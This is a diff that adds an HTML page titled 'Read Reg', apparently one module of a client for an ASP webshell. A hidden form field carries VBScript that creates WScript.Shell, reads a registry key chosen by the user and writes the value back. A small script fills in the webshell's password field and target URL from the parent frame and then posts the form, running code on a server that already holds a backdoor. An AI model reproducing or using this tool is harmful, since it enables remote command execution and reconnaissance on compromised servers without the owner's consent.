@@ -1,0 +1,18 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Read Reg </div>
+<form name="xform" method="post" target="_blank">
+<table width="100%"  border="0" align="center">
+<tr>
+<td width="8%">Path:</td>
+<td width="92%"><input name="path" type="text" id="path" value="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName" size="80"></td>
+</tr>
+<input type="hidden" name="code" value='Execute("response.clear:thePath=request(""path""):set wsx=Server.CreateObject(""WScript.Shell""):theArray=wsX.RegRead(thePath):If IsArray(theArray) Then:For i=0 To UBound(theArray):StrResult=StrResult&theArray(i):next:Else:StrResult=theArray:End if:response.write(StrResult):response.end")'>
+</table>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
